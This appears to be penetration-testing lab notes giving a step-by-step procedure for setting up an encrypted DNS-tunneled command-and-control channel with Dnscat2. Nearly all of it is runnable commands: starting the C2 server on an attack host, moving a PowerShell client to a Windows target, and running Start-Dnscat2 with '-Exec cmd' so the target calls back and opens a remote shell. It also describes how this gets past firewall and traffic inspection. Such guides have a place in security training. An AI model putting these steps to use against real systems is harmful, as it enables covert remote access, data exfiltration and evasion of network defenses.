## DNS Tunneling with Dnscat2

This guide covers the methodology and step-by-step process for establishing an encrypted Command-and-Control (C2) channel and tunneling data or interactive shells using the DNS protocol with Dnscat2.
### Methodology Overview
Dnscat2 tunnels data by encoding it inside TXT records (or via direct queries) within the DNS protocol over UDP port 53. Because enterprise environments rely heavily on internal DNS servers to resolve hostnames, external DNS requests or recursive lookups can be abused to exfiltrate data and establish interactive remote shells, effectively bypassing standard firewalls and traffic inspections that target HTTP/HTTPS.
### Step-by-Step Process

#### Step 1: Install and Start the Dnscat2 Server on the Attack Host

1. Clone the repository and install dependencies:
    ```bash
    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server/
    sudo gem install bundler
    sudo bundle install
    ```
    
2. Start the server, binding it to your attack interface and specifying a domain and port:
    ```bash
    sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
    ```
    
    _Note: The server output will generate a unique pre-shared secret key required for client authentication and encryption._
    

#### Step 2: Prepare the Dnscat2 Client for the Target

Clone the PowerShell-compatible client (`dnscat2-powershell`) to your attack host and transfer the `dnscat2.ps1` file to the target Windows machine:
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

#### Step 3: Execute the Client and Establish the Tunnel

1. On the target Windows host, open PowerShell and import the module:
    ```PowerShell
    Import-Module .\dnscat2.ps1
    ```
    
2. Initiate the connection back to your attack host, supplying the DNS server IP, domain name, pre-shared secret, and command execution argument (e.g., `cmd`):
    ```PowerShell
    Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <generated_secret_key> -Exec cmd
    ```

#### Step 4: Interact with the Established Session
1. Confirm that the session has been established and verified on your attack host console:
    ```
    New window created: 1
    Session 1 Security: ENCRYPTED AND VERIFIED!
    ```
    
2. Switch to and interact with the active session window to access the remote shell prompt:
    ```bash
    dnscat2> window -i 1
    ```